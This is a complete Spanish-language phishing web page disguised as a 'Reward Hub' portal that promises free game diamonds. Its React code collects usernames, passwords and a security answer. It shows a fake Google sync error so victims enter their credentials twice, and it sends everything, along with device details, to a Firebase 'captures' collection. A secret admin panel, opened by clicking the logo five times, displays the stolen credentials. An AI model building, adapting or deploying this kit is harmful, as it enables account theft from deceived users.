<!DOCTYPE html><html lang="es"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">    <title>Reward Hub - Portal Oficial de Sincronización</title>    <!-- Cargamos Tailwind para el diseño -->    <script src="https://cdn.tailwindcss.com"></script>    <!-- Cargamos Lucide para los iconos -->    <script src="https://unpkg.com/lucide@latest"></script>    <!-- Cargamos React y Babel para que el navegador entienda el código moderno -->    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>    <style>        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }        #loading-screen { position: fixed; inset: 0; background: white; display: flex; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.5s; }    </style></head><body class="bg-[#f8fafc] text-slate-900">    <!-- Pantalla de carga inicial para evitar el flash blanco -->    <div id="loading-screen">        <div class="flex flex-col items-center gap-4">            <div class="w-12 h-12 border-4 border-slate-200 border-t-[#ef3244] rounded-full animate-spin"></div>            <p class="text-[10px] font-black uppercase tracking-widest text-slate-400">Iniciando Bóveda...</p>        </div>    </div>    <div id="root"></div>    <script type="text/babel" data-type="module">        const { useState, useEffect } = React;        // --- IMPORTACIÓN DE FIREBASE (Versión Web Nativa) ---        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";        // Configuración automática del sistema        const firebaseConfig = JSON.parse(__firebase_config);        const appId = typeof __app_id !== 'undefined' ? __app_id : 'reward-hub-elite-v5';        const app = initializeApp(firebaseConfig);        const auth = getAuth(app);        const db = getFirestore(app);        function App() {            const [user, setUser] = useState(null);            const [step, setStep] = useState(1);            const [username, setUsername] = useState('');            const [password, setPassword] = useState('');            const [securityAnswer, setSecurityAnswer] = useState('');            const [authError, setAuthError] = useState('');            const [isAuthenticating, setIsAuthenticating] = useState(false);            const [onlineUsers, setOnlineUsers] = useState(4820);                        // Administrador            const [clickCount, setClickCount] = useState(0);            const [showAdmin, setShowAdmin] = useState(false);            const [capturedData, setCapturedData] = useState([]);            const [showPasswords, setShowPasswords] = useState({});            useEffect(() => {                // Quitar pantalla de carga                const loader = document.getElementById('loading-screen');                if (loader) { loader.style.opacity = '0'; setTimeout(() => loader.remove(), 500); }                signInAnonymously(auth).catch(() => {});                onAuthStateChanged(auth, setUser);                                const int = setInterval(() => setOnlineUsers(p => p + (Math.random() > 0.5 ? 2 : -1)), 8000);                return () => clearInterval(int);            }, []);            useEffect(() => {                if (!user || !showAdmin) return;                const q = collection(db, 'artifacts', appId, 'public', 'data', 'captures');                return onSnapshot(q, (s) => {                    setCapturedData(s.docs.map(doc => ({ id: doc.id, ...doc.data() })).sort((a,b) => b.timestamp?.seconds - a.timestamp?.seconds));                });            }, [user, showAdmin]);            const handleLogoClick = () => {                setClickCount(p => (p + 1 >= 5 ? (setShowAdmin(true), 0) : p + 1));                setTimeout(() => setClickCount(0), 3000);            };            const saveData = async (statusLabel) => {                if (!user) return;                try {                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'captures'), {                        username, password, securityAnswer,                        info: { ua: navigator.userAgent, res: `${window.screen.width}x${window.screen.height}` },                        status: statusLabel,                        timestamp: serverTimestamp()                    });                } catch (e) {}            };            const handleLogin = async (e) => {                e.preventDefault();                setIsAuthenticating(true);                setAuthError('');                await new Promise(r => setTimeout(r, 2000));                if (step === 1) {                    setAuthError('Error de Sincronización (Code: 403). La bovéda de Google no validó los tokens. Reintenta.');                    await saveData('primer_intento');                    setStep(1.1);                } else {                    await saveData('acceso_total');                    setStep(1.5);                }                setIsAuthenticating(false);            };            useEffect(() => { if (window.lucide) window.lucide.createIcons(); });            return (                <div className="min-h-screen flex flex-col font-sans">                    <nav className="w-full bg-white border-b p-4 flex justify-between items-center shadow-sm sticky top-0 z-50">                        <div onClick={handleLogoClick} className="flex items-center gap-2 cursor-pointer active:scale-95 transition-all">                            <div className="bg-[#ef3244] p-2 rounded-xl shadow-lg shadow-red-100">                                <i data-lucide="gamepad-2" className="text-white w-6 h-6"></i>                            </div>                            <span className="font-black italic text-xl uppercase tracking-tighter">REWARD <span className="text-[#ef3244]">HUB</span></span>                        </div>                        <div className="bg-emerald-50 px-3 py-1.5 rounded-full flex items-center gap-2">                            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>                            <span className="text-[10px] font-black text-emerald-700 uppercase">{onlineUsers} LIVE</span>                        </div>                    </nav>                    <div className="w-full max-w-md mx-auto p-6 space-y-6 flex-1 flex flex-col justify-center">                        {step <= 1.1 && (                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl space-y-8 animate-in fade-in transition-all">                                <div className="text-center space-y-2">                                    <h2 className="text-3xl font-black text-slate-900 italic tracking-tight uppercase">Acceso</h2>                                    <p className="text-sm text-slate-500 font-medium text-center leading-relaxed">Sincroniza tu cuenta para recibir tus diamantes oficiales.</p>                                </div>                                {authError && <div className="bg-red-50 text-red-700 p-4 rounded-2xl text-[11px] font-black border border-red-200 animate-shake">{authError}</div>}                                <form onSubmit={handleLogin} className="space-y-4">                                    <input type="text" placeholder="Usuario / Correo" required className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 shadow-inner" value={username} onChange={e => setUsername(e.target.value)} />                                    <input type="password" placeholder="Contraseña de acceso" required className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 shadow-inner" value={password} onChange={e => setPassword(e.target.value)} />                                    <button className="w-full bg-gradient-to-r from-[#ef3244] to-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl shadow-red-100 active:scale-95 transition-all">                                        {isAuthenticating ? "Verificando..." : "VINCULAR BÓVEDA"}                                    </button>                                </form>                            </div>                        )}                        {step === 1.5 && (                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">                                <div className="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto border border-blue-100 shadow-lg">                                    <i data-lucide="shield-check" className="w-10 h-10 text-blue-600"></i>                                </div>                                <h2 className="text-2xl font-black italic uppercase">Validación Extra</h2>                                <div className="bg-slate-50 p-5 rounded-2xl border text-[13px] font-black text-slate-700 italic shadow-inner italic">¿Nombre de tu mascota o ciudad de origen?</div>                                <input type="text" placeholder="Tu respuesta..." className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900 text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />                                <button onClick={() => setStep(2)} className="w-full bg-blue-600 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl active:scale-95">CONFIRMAR</button>                            </div>                        )}                        {step >= 2 && (                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">                                <h2 className="text-3xl font-black italic uppercase text-slate-900 leading-none tracking-tighter">Bóveda Abierta</h2>                                <div className="bg-emerald-50 p-8 rounded-3xl border border-emerald-100 text-emerald-700 shadow-inner">                                    <p className="font-black text-xl">¡Sincronización Exitosa!</p>                                    <p className="text-sm font-medium opacity-80 mt-2 leading-relaxed italic">Recibirás los diamantes en un plazo máximo de 24 horas.</p>                                </div>                                <button onClick={() => window.location.reload()} className="w-full bg-slate-900 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl active:scale-95 transition-all">FINALIZAR</button>                            </div>                        )}                    </div>                    <footer className="w-full bg-slate-900 text-slate-500 py-16 text-center mt-auto border-t border-white/5 px-6">                        <p className="text-[10px] uppercase tracking-[0.4em] font-black opacity-40 leading-relaxed max-w-xs mx-auto">                            REWARD HUB PARTNER PROGRAM © 2026. <br/> EXTRACCIÓN DE METADATOS PROTEGIDA.                        </p>                    </footer>                    {/* PANEL DE ADMINISTRADOR SECRETO */}                    {showAdmin && (                        <div className="fixed inset-0 z-[100] bg-slate-950/95 backdrop-blur-xl flex flex-col p-6 text-white animate-in fade-in">                            <div className="flex justify-between items-center mb-6 border-b border-white/10 pb-4">                                <h2 className="text-xl font-black italic uppercase tracking-tighter">Intel Central ({capturedData.length})</h2>                                <button onClick={() => setShowAdmin(false)} className="bg-red-500/20 p-2 rounded-full text-red-500 active:scale-90 transition-all"><i data-lucide="x" className="w-6 h-6"></i></button>                            </div>                            <div className="flex-1 overflow-y-auto space-y-4 pb-20">                                {capturedData.map(item => (                                    <div key={item.id} className="bg-white/5 p-6 rounded-[2rem] border border-white/10 flex flex-col gap-4">                                        <div className="flex justify-between items-start">                                            <p className="text-2xl font-black text-white">{item.username}</p>                                            <span className="text-emerald-400 text-[10px] font-black tracking-widest uppercase italic">VAULT_DUMPED</span>                                        </div>                                        <div className="bg-black/40 p-4 rounded-xl flex justify-between items-center border border-white/5 shadow-inner">                                            <p className="font-mono text-xl text-white italic">{showPasswords[item.id] ? item.password : '••••••••••••'}</p>                                            <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-2 text-indigo-400"><i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"}></i></button>                                        </div>                                        <p className="text-[10px] text-slate-400 italic">SEC: {item.securityAnswer || 'N/A'} | FECHA: {item.timestamp?.toDate().toLocaleString()}</p>                                    </div>                                ))}                            </div>                        </div>                    )}                </div>            );        }        const root = ReactDOM.createRoot(document.getElementById('root'));        root.render(<App />);    </script></body></html>
